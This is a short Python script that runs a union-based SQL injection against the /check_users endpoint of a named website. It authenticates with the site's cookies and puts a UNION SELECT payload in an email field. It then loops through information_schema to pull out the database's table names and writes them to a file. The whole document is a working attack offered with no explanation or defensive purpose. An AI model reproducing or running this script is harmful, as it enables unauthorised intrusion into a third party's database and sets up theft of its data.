
import requests,json
headers={"cookie":"<COOKIES OF THE SITE  HERE>"}
arr = []
def a(b):
	posts1 = {"0":{"email":"-lol@ohbabyyyy.com'union select 1,2,3,(select table_name from information_schema.tables where table_schema=database() limit "+str(b)+",1)-- -","name":"a"}}
	posts = {"users":json.dumps(posts1)}
	r = requests.post("https://www.getdatbbcinya.com/check_users",data=posts,headers=headers,allow_redirects=False)
	l = json.loads(r.text)[0]['profileimage']
	a = l.split("/")
	s = open("tables.txt","a")
	s.write(a[-1]+"\n")
	s.close()
	print a[-1]
c=0
while c<356:
	a(c)
	c = c + 1
